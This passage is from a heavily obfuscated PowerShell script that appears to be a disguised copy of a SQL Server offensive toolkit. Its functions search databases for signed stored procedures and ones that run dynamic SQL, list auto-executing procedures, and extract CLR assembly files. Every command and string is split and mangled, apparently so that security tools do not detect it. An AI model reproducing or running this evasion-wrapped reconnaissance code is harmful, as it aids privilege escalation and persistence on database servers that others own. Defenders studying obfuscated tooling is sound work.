 ')  -F [cHar]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'AN'+'D '+'R'+'OUTINE_'+'CATALOG '+'n'+'ot '+'lik'+'e '+(('nMX'+'msdbnM'+'X ') -REplaCe'nMX',[CHAr]39)+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$AutoExecFilter "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$ProcedureNameFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$KeywordFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ORDE'+'R '+'BY'+' '+'R'+'O'+'UTINE'+'_NAME')

            
            if(${onl`ySIg`NeD}){
                ${QU`e`Ry} = (' '+' '+'use'+' '+"[$DbName];
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'S'+'ELEC'+'T '+' '+"'$ComputerName' "+'as'+' '+'[Com'+'p'+'ut'+'erName]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'a'+'s '+'[I'+'nstan'+'ce],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'p'+'r.RO'+'U'+'TINE_CATALOG '+'a'+'s '+'DB'+'_NAM'+'E,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'spr.'+'SPECIFI'+'C'+'_SCH'+'EMA'+' '+'a'+'s '+'S'+'CHE'+'M'+'A_NAME'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'spr'+'.R'+'OUTINE_N'+'AME '+'a'+'s '+'S'+'P_NA'+'ME,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'spr.ROU'+'TINE_DEFI'+'NIT'+'IO'+'N'+' '+'as'+' '+'SP'+'_COD'+'E,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'CAS'+'E '+'c'+'p'+'.cryp'+'t_t'+'ype
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'when'+' '+('hH'+'uS'+'PVChHu ')."reP`LaCe"('hHu',[stRing][cHaR]39)+'then'+' '+'c'+'er.nam'+'e
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'when'+' '+('{'+'0}C'+'PVC{'+'0} ')-f[ChAr]39+'t'+'hen '+'C'+'er.na'+'me
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'whe'+'n '+('KaeSP'+'VAKae ')."rE`PlACe"('Kae',[sTrING][cHaR]39)+'th'+'en '+'a'+'k.na'+'me
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'whe'+'n '+('GJTC'+'PVA'+'GJT ')."REp`lace"('GJT',[stRiNg][Char]39)+'the'+'n '+'a'+'k'+'.n'+'ame
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EN'+'D '+'as'+' '+'CERT_N'+'AM'+'E,'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'sp.na'+'m'+'e '+'as'+' '+'CE'+'R'+'T_LO'+'GIN,'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'p'+'.sid '+'a'+'s '+'CERT_'+'S'+'ID
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'F'+'ROM '+'sys.cr'+'ypt_pr'+'op'+'erti'+'es '+'c'+'p
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'JO'+'IN '+'s'+'ys.objec'+'ts '+'o '+'ON'+' '+'cp.majo'+'r_'+'id '+'= '+'o.o'+'b'+'ject_id
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'LEF'+'T '+'JOI'+'N '+'sys.c'+'ertifi'+'ca'+'tes '+'cer'+' '+'O'+'N '+'c'+'p.th'+'umbpri'+'n'+'t '+'= '+'cer.thumbp'+'r'+'in'+'t
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'LE'+'FT '+'JOI'+'N '+'sy'+'s.'+'asymmetric'+'_'+'ke'+'ys'+' '+'a'+'k '+'O'+'N '+'cp.thum'+'b'+'p'+'ri'+'nt '+'= '+'ak'+'.thumbpr'+'i'+'nt'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'LEFT'+' '+'J'+'OIN '+'INFORMATION'+'_SC'+'HEMA'+'.R'+'OUTINES'+' '+'spr'+' '+'o'+'n '+'spr.ROU'+'TI'+'NE_N'+'AM'+'E '+'= '+'o.n'+'ame
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'LEFT'+' '+'JO'+'IN '+'sy'+'s.s'+'e'+'rver'+'_p'+'rinc'+'ipals '+'s'+'p '+'on'+' '+'s'+'p.si'+'d '+'= '+'cer.'+'sid
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'W'+'HERE '+'o.ty'+'pe'+'_desc '+'= '+('Q'+'pASQL'+'_STO'+'R'+'ED_PR'+'OCEDUREQp'+'A'+'AN'+'D'+'
 ')."R`eP`lAcE"('QpA',[STRiNG][cHAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'(ROUTIN'+'E_D'+'EFINI'+'TION '+'l'+'ike '+('{'+'0}%sp_'+'exe'+'cutesql%{0}'+' ')-F[chaR]39+'OR
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ROUTIN'+'E_DE'+'FINI'+'TION '+'like'+' '+('{0}%sp'+'_sq'+'l'+'exec%{0'+'} ')  -f  [ChAR]39+'OR'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ROUTINE_'+'D'+'EF'+'INITION '+'li'+'ke '+('I9'+'J%exe'+'c ')."Re`P`lacE"(([CHAR]73+[CHAR]57+[CHAR]74),[StRInG][CHAR]39)+(('@%'+'Wxd ')-RepLACE'Wxd',[CHAR]39)+'OR'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ROUTIN'+'E_DE'+'FINITIO'+'N'+' '+'li'+'ke '+(('wk'+'N%ex'+'ec ')-CRePLAcE([cHAr]119+[cHAr]107+[cHAr]78),[cHAr]39)+('(%O'+'Ce'+' ')."Re`pl`ACe"(([chAR]79+[chAR]67+[chAR]101),[strinG][chAR]39)+'OR'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'RO'+'UT'+'INE_DEF'+'INI'+'TIO'+'N '+'li'+'ke '+('{'+'0}%'+'exec(%'+'{0} ')  -f [cHAR]39+'OR
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'RO'+'UTINE_DE'+'FIN'+'I'+'TION '+'like'+' '+(('T2'+'6%exec'+'ute ')  -cREpLACe ([ChAr]84+[ChAr]50+[ChAr]54),[ChAr]39)+('@%khT'+' ')."re`Pla`CE"(([chAR]107+[chAR]104+[chAR]84),[strING][chAR]39)+'O'+'R
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'RO'+'UT'+'IN'+'E_DEFI'+'NI'+'TION '+'like'+' '+('T'+'8H%'+'exe'+'cute ')."RE`PLaCe"('T8H',[stRIng][CHar]39)+('(%'+'lPj ')."REP`lACE"(([cHAr]108+[cHAr]80+[cHAr]106),[STrinG][cHAr]39)+'OR
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'R'+'O'+'UTINE'+'_DE'+'FI'+'NITION '+'lik'+'e '+(('w'+'Ph'+'%execute'+'(%'+'wPh'+' ')  -CReplaCe'wPh',[ChAr]39)+'O'+'R
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ROUTINE'+'_DEF'+'INI'+'TION'+' '+'like'+' '+('bFW'+'%bFWbFWbFWb'+'FWbF'+'WbFW'+'+%bFW'+' ')."rE`Pl`AcE"(([ChAR]98+[ChAR]70+[ChAR]87),[strInG][ChAR]39)+'OR'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'R'+'OU'+'TINE_'+'DEFINITION '+'l'+'ike '+('h32'+'%h32h32h32h3'+'2h3'+'2'+'h32 ')."r`EPLA`CE"(([ChAr]104+[ChAr]51+[ChAr]50),[sTring][ChAr]39)+('+%{'+'0})'+' ')-f[ChaR]39+'AN'+'D
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'R'+'OUTINE_'+'CATALOG'+' '+'not'+' '+'lik'+'e '+('5'+'jWmsdb'+'5jW ')."RE`pLACe"(([ChaR]53+[ChaR]106+[ChaR]87),[sTRiNg][ChaR]39)+'AND'+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'RO'+'UTINE_'+'DE'+'FI'+'NITIO'+'N '+'l'+'ike '+(('nIL%+'+'%nI'+'L')  -rEPLACe  ([CHaR]110+[CHaR]73+[CHaR]76),[CHaR]39))
            }

            
            ${t`B`lPrOc`StE`mP} = &("{1}{2}{3}{0}"-f 'Query','Get','-SQ','L') -Instance ${In`S`TA`NcE} -Query ${QU`e`Ry} -Username ${USEr`NA`me} -Password ${p`AsSwO`Rd} -Credential ${c`R`EdeNTi`Al} -SuppressVerbose

            
            ${T`BlpRO`CS`CO`Unt} = ${tbLpRoC`S`TE`Mp}."r`ows"."C`oUnT"
            &("{2}{0}{1}" -f 'bo','se','Write-Ver') ("$Instance "+': '+'- '+"$TblProcsCount "+'found'+' '+'in'+' '+"$DbName "+'dat'+'abase')

            
            ${TBLP`RoCS} = ${Tb`LP`ROCs} + ${tB`l`proC`StEmp}
        }
    }

    End
    {
        
        ${tb`lpr`O`Cs}
    }
}





Function  G`Et-s`QLstO`RE`DPROC`e`DUREauTO`e`xec
{
    

    [CmdletBinding()]
    Param(
        [Parameter(MaNDatoRY = ${F`A`lse},
        hElpmESsage = {"{1}{3}{4}{5}{7}{8}{2}{0}{6}" -f' with','SQL Ser','enticate','ve','r or domain acc','ount to a','.','ut','h'})]
        [string]${usER`NAME},

        [Parameter(MAndatORy = ${Fa`lsE},
        helpmESSagE = {"{7}{8}{1}{4}{0}{13}{10}{5}{11}{3}{9}{14}{6}{12}{2}"-f 'account pas','L Se','ith.',' a','rver or domain ','or','ca','S','Q','uthe','w','d to','te w','s','nti'})]
        [string]${p`As`sw`oRd},

        [Parameter(MAnDAtoRy = ${FA`LSE},
        HelPmEssAGE = {"{3}{4}{2}{0}{1}{5}" -f 'ede','n','r','Windo','ws c','tials.'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${C`Re`DeN`TiAL} =  (  get-VAriAbLE  ("045"+"9m2")).valUE::"E`MptY",

        [Parameter(mANDAtORy = ${Fa`LSe},
                VAluEfrOmpipELiNebypROperTyNaMe = ${T`RUE},
        HELpmeSSagE = {"{5}{0}{2}{9}{1}{3}{4}{8}{6}{7}"-f ' ','er in','S','s','ta','SQL','onnection ','to.','nce to c','erv'})]
        [string]${instAn`ce},

        [Parameter(MAndAtory = ${FaL`SE},
                VAlUEfrOMpIPelIneByPROpeRTynaME = ${t`Rue},
        hELPMeSSagE = {"{0}{3}{2}{1}" -f'Pro','re name.','u','ced'})]
        [string]${PrOcE`DUr`eN`AME},

        [Parameter(maNDatory = ${f`ALsE},
                vaLUefRomPiPelINEBYpRopErtynaMe = ${Tr`UE},
        HElPmessAGE = {"{13}{0}{11}{6}{4}{5}{3}{10}{2}{9}{8}{12}{7}{1}" -f 'r proce','.',' inc','h',' ','t','es','rd','ude the k','l','at','dur','eywo','Filter fo'})]
        [string]${K`EYWO`RD},

        [Parameter(maNdAtoRY = ${fal`SE},
        helPmESSaGE = {"{10}{4}{1}{3}{8}{6}{5}{0}{2}{9}{7}" -f ' wh','s','e','e ','erbo','ed',' Us','tion is wrapped.','errors. ','n func','Suppress v'})]
        [switch]${SuPpres`sv`ER`B`o`se}
    )

    Begin
    {
        
        ${T`B`L`pRoCs} = &("{2}{1}{0}"-f'ect','bj','New-O') -TypeName ("{1}{3}{4}{0}{2}{5}" -f'm.Data.D','S','ataT','ys','te','able')

        
        if (${p`Ro`c`e`DUrenAME})
        {
            ${P`Roc`EDU`RENa`MEfiLtER} = (' '+'A'+'ND '+'ROUTINE'+'_N'+'AME '+'li'+'ke '+"'$ProcedureName'")
        }
        else
        {
            ${ProcEDUrE`NAmE`Fi`LteR} = ''
        }

        
        if (${KEy`wo`Rd})
        {
            ${ke`yWordFi`lTER} = (' '+'A'+'ND '+'ROUTIN'+'E_D'+'EFINIT'+'IO'+'N '+'l'+'ike '+"'%$Keyword%'")
        }
        else
        {
            ${KEywo`RdFI`L`TEr} = ''
        }
    }

    Process
    {
        
        If (${i`NS`TaNcE})
        {
            ${COmpu`TE`R`Name} = ${i`NStA`NCE}.("{1}{0}"-f't','spli').Invoke('\')[0].("{1}{0}"-f 't','spli').Invoke(',')[0]
            ${I`NStancE} = ${in`Sta`NCe}
        }
        else
        {
            ${co`mp`UterN`AMe} = ${en`V`:CoM`PUTeRnaMe}
            ${I`NsT`ANCe} = '.\'
        }

        
        ${tE`s`T`ConNEcTion} = &("{5}{4}{2}{0}{1}{3}"-f 'n','ne','SQLCo','ctionTest','t-','Ge') -Instance ${IN`s`TAnce} -Username ${USE`RNa`mE} -Password ${pa`sswo`RD} -Credential ${crEDe`N`Ti`Al} -SuppressVerbose | &("{1}{2}{0}" -f '-Object','Whe','re') -FilterScript {
            ${_}."S`TAt`US" -eq ("{0}{1}{2}" -f'Acces','s','ible')
        }
        if(${te`S`TCoNN`ectI`oN})
        {
            if( -not ${Su`P`PRESS`V`e`RBose})
            {
                &("{0}{2}{1}{3}" -f 'Writ','Ve','e-','rbose') -Message ("$Instance "+': '+'Conn'+'e'+'ct'+'ion '+'S'+'ucces'+'s.')
                &("{0}{1}{2}" -f 'Write-V','er','bose') -Message ("$Instance "+': '+'Checkin'+'g '+'for'+' '+'auto'+'exe'+'c '+'s'+'to'+'red '+'p'+'roced'+'ures...')
            }
        }
        else
        {
            if( -not ${supp`Re`s`S`VERBOse})
            {
                &("{0}{1}{2}"-f'Write-Ver','bos','e') -Message ("$Instance "+': '+'Co'+'n'+'nection '+'Fai'+'led'+'.')
            }
            return
        }

        
        ${TB`l`DatabaSes} |
        &("{0}{3}{1}{2}" -f 'For','ec','t','Each-Obj') -Process {
            
            ${d`BnAMe} = ${_}."datAB`Ase`NAme"

            
            ${QU`ERy} = (' '+' '+'u'+'se '+'[mas'+'ter]'+';
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SEL'+'ECT'+' '+' '+"'$ComputerName' "+'a'+'s '+'['+'Comput'+'erName],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'[Instan'+'ce]'+','+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ROUTINE_'+'CATA'+'LO'+'G'+' '+'A'+'S '+'['+'Data'+'b'+'aseName'+']'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ROUTIN'+'E'+'_S'+'CHEMA'+' '+'AS'+' '+'[S'+'ch'+'e'+'maName],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ROUTINE_N'+'AM'+'E '+'a'+'s '+'[Proced'+'u'+'re'+'Name'+'],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ROUT'+'IN'+'E_TYP'+'E '+'as'+' '+'['+'Pro'+'cedureType],'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'RO'+'UTIN'+'E'+'_'+'DEFINITION '+'a'+'s '+'[Pr'+'ocedure'+'D'+'efinition'+'],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SQL_'+'DATA'+'_ACC'+'ESS,'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'R'+'OUTINE'+'_BODY,'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'CR'+'EATED,'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'LA'+'ST_ALT'+'ERED,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'b.'+'is_ms_sh'+'ipp'+'ed,'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'b.is'+'_au'+'t'+'o'+'_e'+'xecu'+'ted
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FRO'+'M '+'['+'INF'+'ORM'+'AT'+'IO'+'N_SCHEMA'+']'+'.'+'[ROUTINE'+'S] '+'a'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'JOI'+'N '+'[s'+'ys].[procedu'+'re'+'s'+'] '+' '+'b
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'O'+'N '+'a.'+'ROUTIN'+'E_NAM'+'E '+'= '+'b.name'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WHER'+'E '+'1=1'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'AND'+' '+'is_au'+'to'+'_execu'+'ted'+' '+'= '+'1
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$ProcedureNameFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$KeywordFilter")

            
            ${tB`l`ProcSt`emP} = &("{2}{0}{1}"-f 'QLQu','ery','Get-S') -Instance ${i`N`StAnce} -Query ${Q`U`ery} -Username ${USeR`NA`mE} -Password ${P`Ass`WORD} -Credential ${CrED`ENT`IAl} -SuppressVerbose
            if(-not ${TBlp`ROCs`Te`Mp}){
                
            }

            
            ${TBLP`Ro`CS} = ${TBLPro`CS} + ${tBLprO`C`STe`MP}
        }
    }

    End
    {
        
        ${T`BlprO`cs}
    }
}















Function  get`-SQLaSs`EMb`LY`File
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mandAtoRy = ${fa`lSE},
        HeLpMessAge = {"{5}{3}{9}{11}{6}{0}{2}{12}{4}{10}{1}{8}{7}"-f 'ain account ','w','to authen','Ser','ic','SQL ','m','h.','it','ve','ate ','r or do','t'})]
        [string]${U`sErNaMe},

        [Parameter(MaNDAToRy = ${f`AlSe},
        hELPMessAGe = {"{6}{9}{3}{7}{4}{1}{2}{5}{0}{8}"-f 'at','in ac','count password','er or ','oma',' to authentic','SQL ','d','e with.','Serv'})]
        [string]${paS`sW`orD},

        [Parameter(mANdatORy = ${fa`l`se},
        hELpmeSSAGe = {"{1}{2}{5}{4}{3}{0}"-f 'credentials.','W','i',' ','s','ndow'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CRed`E`N`TiaL} =  (  dIr  VaRiAble:0459m2 ).VAlUE::"EM`pty",

        [Parameter(MANDaTorY = ${f`A`LSE},
                ValUEfroMPipelinEByPrOPerTyNAME = ${t`RuE},
        HELPmEsSAGe = {"{1}{0}{8}{3}{5}{2}{6}{4}{7}"-f 'erver inst','SQL S','e','e','ion t',' to conn','ct','o.','anc'})]
        [string]${I`Nst`AN`Ce},

        [Parameter(MANdATORY = ${FaL`Se},
                VAlueFROmPIpelineBYpRopeRtynaMe = ${t`RUe},
        HeLpmESsaGE = {"{3}{5}{1}{2}{4}{0}"-f'.','rver databa','se','SQL ',' name','Se'})]
        [string]${D`ATaB`AseN`Ame},

        [Parameter(ManDAtORy = ${fa`lse},
                VALUEFRompIPeLinebypROpERTYNaMe = ${t`Rue},
        HelpmESsaGe = {"{2}{4}{0}{3}{1}{5}"-f 'r file','a','Filter f','n','o','mes.'})]
        [string]${a`sseMbL`Y`Na`mE},

        [Parameter(maNDATory = ${FaL`se},
                VaLUeFrOMPIpeLiNEBYprOPERtYnAmE = ${tr`Ue},
        helpmeSsaGe = {"{4}{0}{3}{5}{2}{1}"-f 'r to e','to.','rt DLLs ','x','Folde','po'})]
        [string]${EX`po`RTf`oLD`eR},

        [Parameter(ManDatoRy = ${fa`lse},
                vALUefroMpiPElInEbYProPErtyNAMe = ${TR`UE},
        heLpMesSAgE = {"{0}{3}{10}{9}{7}{11}{2}{4}{6}{12}{5}{1}{13}{8}" -f 'D','lt','atab','o no','ase us','efau','ers associated wi',' ','abases.','ow','t sh','d','th d',' dat'})]
        [Switch]${NODEF`AUL`Ts},

        [Parameter(MANdAtOry = ${fa`Lse},
        hElpMessAgE = {"{5}{1}{4}{0}{3}{6}{8}{2}{7}"-f 's','res','nct','e errors.  Used when','s verbo','Supp',' f','ion is wrapped.','u'})]
        [switch]${suPPR`E`SSverbOsE}
    )

    Begin
    {
        
        ${TbLAsseMbL`Y`Fi`LeS} = &("{0}{1}{2}"-f 'N','ew-Ob','ject') -TypeName ("{4}{6}{1}{0}{3}{2}{5}"-f 'Data','a.','abl','T','S','e','ystem.Dat')
        ${N`ULl} = ${T`BLa`sSEmblYFil`ES}."COlU`mns".("{0}{1}" -f 'Ad','d').Invoke(("{1}{0}{3}{2}" -f 'ter','Compu','me','Na'))
        ${N`Ull} = ${T`BLa`sSemBL`Yf`Iles}."cO`l`UmnS".("{1}{0}" -f'dd','A').Invoke(("{0}{1}{2}"-f'Insta','n','ce'))
        ${N`UlL} = ${T`BlA`SsE`MB`lYfILes}."co`lUmnS".("{0}{1}"-f'Ad','d').Invoke(("{2}{0}{1}"-f'se','Name','Databa'))
        ${nU`LL} = ${Tbl`AS`sEm`BLy`FILES}."col`UmNs".("{0}{1}" -f 'Ad','d').Invoke(("{1}{2}{0}{3}"-f'mbly','as','se','_id'))
        ${N`ULL} = ${Tb`LASsEmblYF`IL`Es}."c`olUmNs".("{1}{0}"-f 'dd','A').Invoke(("{2}{0}{1}" -f 'na','me','assembly_'))
        ${n`ULL} = ${TbL`A`SSEM`BlYFil`Es}."cOLUM`NS".("{1}{0}" -f 'd','Ad').Invoke(("{1}{0}{2}" -f 'e_','fil','id'))
        ${Nu`ll} = ${tbL`A`ssE`mBLyfI`les}."c`O`lumnS".("{0}{1}"-f 'A','dd').Invoke(("{2}{0}{1}" -f 'l','e_name','fi'))
        ${nu`ll} = ${T`BlA`sSEmB`lyfilEs}."CO`lumns".("{0}{1}"-f 'A','dd').Invoke(("{2}{1}{0}" -f 'me','lr_na','c'))        
        ${nU`ll} = ${tBlASsEMB`l`YFi`LEs}."C`o`luMNS".("{0}{1}" -f 'Ad','d').Invoke(("{1}{0}" -f 'ontent','c'))
        ${nU`ll} = ${TblAsSeM`B`lyf`ilES}."c`oLuM`Ns".("{0}{1}"-f 'Ad','d').Invoke(("{4}{3}{0}{2}{1}"-f '_set_d','sc','e','sion','permis'))
        ${N`ULl} = ${Tb`lA`SsemblYf`ILes}."co`lUMns".("{1}{0}"-f'dd','A').Invoke(("{0}{1}{2}"-f 'create','_dat','e'))
        ${n`UlL} = ${tbL`ASS`EM`BLYfILEs}."C`olum`Ns".("{1}{0}"-f'dd','A').Invoke(("{2}{1}{3}{0}" -f 'te','_','modify','da'))
        ${Nu`Ll} = ${tbLASs`E`MBly`Fi`l`ES}."colU`mNS".("{0}{1}" -f 'A','dd').Invoke(("{2}{1}{3}{0}"-f'efined','_user_','is','d'))
    }

    Process
    {
        

        
        ${CO`mPu`T`ErnamE} = &("{1}{2}{0}{5}{4}{3}" -f'pu','G','et-Com','ce','stan','terNameFromIn') -Instance ${INsT`AN`Ce}

        
        if(-not ${i`Ns`Ta`NcE})
        {
            ${iN`STa`NcE} = ${env:co`MpuTe`RN`Ame}
        }

        
        ${t`es`TconnEC`TiON} = &("{1}{4}{0}{5}{2}{3}" -f'LConnect','Get-','nTe','st','SQ','io') -Instance ${i`N`sTa`NCe} -Username ${U`SErnA`ME} -Password ${passwO`Rd} -Credential ${cR`E`deNT`ial} -SuppressVerbose | &("{1}{2}{3}{0}" -f 'ct','Wh','ere','-Obje') -FilterScript {
            ${_}."sTat`Us" -eq ("{1}{0}{2}"-f'si','Acces','ble')
        }

        if(${tEstcONn`e`cTI`On})
        {
            if( -not ${SuP`P`R`E`SSVerBosE})
            {
                &("{4}{1}{0}{2}{3}"-f 'ite-V','r','erb','ose','W') -Message ("$Instance "+': '+'Co'+'nne'+'ction '+'Suc'+'ce'+'ss.')
            }
        }
        else
        {
            if( -not ${SuP`P`R`esSve`RbOsE})
            {
                &("{1}{2}{0}{3}"-f 'ite-','W','r','Verbose') -Message ("$Instance "+': '+'Conne'+'ction'+' '+'F'+'a'+'iled.')
            }
            return
        }

        
        if(${N`O`dEFAULts})
        {
            ${tBlDa`T`AbA`s`ES} = &("{0}{3}{4}{2}{1}" -f 'Ge','ase','b','t-SQLDa','ta') -Instance ${inST`A`N`cE} -Username ${uS`ernA`mE} -Password ${PAS`sWORd} -Credential ${cr`E`dE`NtiAL} -HasAccess -DatabaseName ${datA`BaS`ENA`ME} -SuppressVerbose  -NoDefaults
        }
        else
        {
            ${t`Bl`daTa`BA`ses} = &("{3}{2}{0}{4}{1}" -f'QLD','base','S','Get-','ata') -Instance ${in`s`TANcE} -Username ${U`s`ernamE} -Password ${PASs`W`oRD} -Credential ${cRe`dEn`TIaL} -HasAccess -DatabaseName ${da`TABA`Se`NAmE} -SuppressVerbose
        }

        
        if(${a`sSeMBLy`NA`Me}){
            ${asSEM`BlY`NaM`Equ`e`RY} = ('WH'+'ERE'+' '+'af.'+'name '+'L'+'IKE '+"'%$AssemblyName%'")
        }else{
            ${a`ssE`MbLY`NaMEQ`UeRY} = ""
        }

        
        ${T`B`LDAt`AbASes} |
        &("{0}{3}{1}{2}"-f 'ForEa','c','t','ch-Obje') -Process {
            
            ${dBn`AMe} = ${_}."Da`T`AbasENA`me"

            if( -not ${sUP`PR`esS`VeRb`oSe})
            {
                &("{3}{0}{1}{2}"-f 'te-Ve','rbos','e','Wri') -Message ("$Instance "+': '+'Gra'+'bbin'+'g '+'assembl'+'y'+' '+'fi'+'le '+'i'+'nf'+'ormatio'+'n '+'fr'+'om '+"$DbName.")
            }

            
            ${qu`E`Ry} = ('US'+'E '+"$DbName;
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SE'+'LECT '+'af'+'.assemb'+'ly'+'_id,
 '+'			'+'		'+' '+' '+'a.na'+'me '+'a'+'s '+'a'+'sse'+'mbl'+'y_name,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'af'+'.'+'file_id,'+'			'+'		 '+' '+'	'+'
'+'					 '+' '+'af.na'+'m'+'e '+'a'+'s '+'file'+'_na'+'me,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'.clr_na'+'me,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'af.conte'+'nt,'+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.permission'+'_set'+'_de'+'sc'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.'+'crea'+'t'+'e'+'_'+'date,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.modif'+'y'+'_date,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'.is_use'+'r'+'_d'+'ef'+'ined'+'
